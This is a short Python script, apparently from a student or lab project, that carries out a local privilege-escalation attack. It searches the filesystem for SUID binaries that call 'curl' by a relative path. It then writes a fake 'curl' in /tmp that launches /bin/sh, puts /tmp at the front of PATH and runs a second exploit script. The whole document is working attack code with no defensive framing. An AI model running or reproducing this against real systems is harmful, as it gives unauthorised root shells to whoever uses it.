import subprocess
import os
import shutil

suid_files_bytes = subprocess.check_output(['find / -type f -perm -u=s 2>>/dev/null | grep .exe'], stdin=subprocess.PIPE, shell=True)
suid_files = suid_files_bytes.decode('utf-8')
suid_files = suid_files.split('\n')

open_doors = []

for file in suid_files:
    if(file):
        try:
            relative_path_calls = subprocess.check_output([f'strings {file} | grep curl'], stdin=subprocess.PIPE, shell=True)
            print("relative path calls: ",relative_path_calls)
            if(relative_path_calls):
                open_doors.append(file)
        except:
            print("no relative paths for curl found in file: ", file)
        

print('open_doors:', open_doors)

terminal_command = 'gnome-terminal -e "bash -c \'' \
                   'cd /tmp; ' \
                   'echo /bin/sh > curl; ' \
                   'chmod 777 curl; ' \
                   'export PATH=/tmp:$PATH; ' \
                   'python3 /home/projekt/Desktop/ProjektIC/exploit2.py; ' \
                   'exec bash\'"'

# Spawn the new terminal
subprocess.call(terminal_command, shell=True)
